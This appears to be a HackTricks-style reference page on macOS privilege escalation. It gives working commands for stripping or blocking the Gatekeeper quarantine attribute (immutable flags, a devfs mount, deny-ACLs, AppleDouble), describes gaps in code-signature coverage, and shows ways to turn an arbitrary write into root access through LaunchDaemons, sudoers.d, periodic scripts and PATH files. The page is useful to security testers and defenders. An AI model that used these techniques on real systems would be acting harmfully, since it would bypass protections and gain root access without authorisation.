## POSIX permissions combinations

Permissions in a **directory**:

* **read** - you can **enumerate** the directory entries
* **write** - you can **delete/write** **files** in the directory and you can **delete empty folders**.&#x20;
  * But you **cannot delete/modify non-empty folders** unless you have write permissions over it.
  * You **cannot modify the name of a folder** unless you own it.
* **execute** - you are **allowed to traverse** the directory - if you don‚Äôt have this right, you can‚Äôt access any files inside it, or in any subdirectories.

### Dangerous Combinations

**How to overwrite a file/folder owned by root**, but:

* One parent **directory owner** in the path is the user
* One parent **directory owner** in the path is a **users group** with **write access**
* A users **group** has **write** access to the **file**

With any of the previous combinations, an attacker could **inject** a **sym/hard link** the expected path to obtain a privileged arbitrary write.

### Folder root R+X Special case

If there are files in a **directory** where **only root has R+X access**, those are **not accessible to anyone else**. So a vulnerability allowing to **move a file readable by a user**, that cannot be read because of that **restriction**, from this folder **to a different one**, could be abuse to read these files.

Example in: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## Symbolic Link / Hard Link

If a privileged process is writing data in **file** that could be **controlled** by a **lower privileged user**, or that could be **previously created** by a lower privileged user. The user could just **point it to another file** via a Symbolic or Hard link, and the privileged process will write on that file.

Check in the other sections where an attacker could **abuse an arbitrary write to escalate privileges**.

## .fileloc

Files with **`.fileloc`** extension can point to other applications or binaries so when they are open, the application/binary will be the one executed.\
Example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>URL</key>
    <string>file:///System/Applications/Calculator.app</string>
    <key>URLPrefix</key>
    <integer>0</integer>
</dict>
</plist>
```

## Arbitrary FD

If you can make a **process open a file or a folder with high privileges**, you can abuse **`crontab`** to open a file in `/etc/sudoers.d` with **`EDITOR=exploit.py`**, so the `exploit.py` will get the FD to the file inside `/etc/sudoers` and abuse it.

For example: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## Avoid quarantine xattrs tricks

### Remove it

```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```

### uchg / uchange / uimmutable flag

If a file/folder has this immutable attribute it won't be possible to put an xattr on it

```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```

### defvfs mount

A **devfs** mount **doesn't support xattr**, more info in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)

```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```

### writeextattr ACL

This ACL prevents from adding `xattrs` to the file

```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```

### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble** file format copies a file including its ACEs.

In the [**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) it's possible to see that the ACL text representation stored inside the xattr called **`com.apple.acl.text`**  is going to be set as ACL in the decompressed file. So, if you compressed an application into a zip file with **AppleDouble** file format with an ACL that prevents other xattrs to be written to it... the quarantine xattr wasn't set into de application:

Check the [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) for more information.

To replicate this we first need to get the correct acl string:

```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```

(Note that even if this works the sandbox write the quarantine xattr before)

Not really needed but I leave it there just in case:

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## Bypass Code Signatures

Bundles contains the file **`_CodeSignature/CodeResources`** which contains the **hash** of every single **file** in the **bundle**. Note that the hash of CodeResources is also **embedded in the executable**, so we can't mess with that, either.

However, there are some files whose signature won't be checked, these have the key omit in the plist, like:

```xml
<dict>
...
	<key>rules</key>
	<dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
	</dict>
	<key>rules2</key>
...
		<key>^(.*/)?\.DS_Store$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>2000</real>
		</dict>
...
		<key>^PkgInfo$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>20</real>
		</dict>
...
		<key>^Resources/.*\.lproj/locversion.plist$</key>
		<dict>
			<key>omit</key>
			<true/>
			<key>weight</key>
			<real>1100</real>
		</dict>
...
</dict>
```

It's possible to claculate the signature of a resource from the cli with:

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
{% endcode %}

## Mount dmgs

A user can mount a custom dmg created even on top of some existing folders. This is how you could create a custom dmg package with custom content:

{% code overflow="wrap" %}
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg 
```
{% endcode %}

## Arbitrary Writes

### Periodic sh scripts

If your script could be interpreted as a **shell script** you could overwrite the **`/etc/periodic/daily/999.local`** shell script that will be triggered every day.

You can **fake** an execution of this script with: **`sudo periodic daily`**

### Daemons

Write an arbitrary **LaunchDaemon** like **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** with a plist executing an arbitrary script like:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
    <dict>
        <key>Label</key>
        <string>com.sample.Load</string>
        <key>ProgramArguments</key>
        <array>
            <string>/Applications/Scripts/privesc.sh</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
    </dict>
</plist>
```

Just generate the script `/Applications/Scripts/privesc.sh` with the **commands** you would like to run as root.

### Sudoers File

If you have **arbitrary write**, you could create a file inside the folder **`/etc/sudoers.d/`** granting yourself **sudo** privileges.

### PATH files

The file **`/etc/paths`** is one of the main places that populates the PATH env variable. You must be root to overwrite it, but if a script from **privileged process** is executing some **command without the full path**, you might be able to **hijack** it modifying this file.

&#x20;You can also write files in **`/etc/paths.d`** to load new folders into the `PATH` env variable.
